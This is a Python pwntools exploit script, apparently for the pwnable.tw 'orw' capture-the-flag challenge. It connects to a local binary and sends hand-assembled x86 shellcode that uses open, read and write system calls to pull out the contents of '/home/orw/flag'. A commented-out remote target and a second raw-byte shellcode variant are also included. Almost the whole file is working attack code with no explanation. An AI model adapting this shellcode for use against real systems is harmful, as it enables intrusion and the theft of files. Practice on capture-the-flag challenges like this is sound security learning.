#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "training.pwnable.tw"
#port = "11002"

#r = remote(host,port)
r=process('./orw.bin')
r.recvuntil(":")
#shellcode = asm(shellcraft.sh())
shellcode = asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6f; push 0x682f2f2f; mov ebx,esp;xor edx,edx;int 0x80;')
sc = "\xeb\x20\x5b\x31\xc0\xb0\x05\x31\xc9\xcd\x80\x89\xc3\xb0\x03\x89\xe1\xb2\x30\xcd\x80\xb0\x04\xb3\x01\xb2\x30\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xdb\xff\xff\xff/home/orw/flag\x00"
r.sendline(shellcode)
r.interactive()
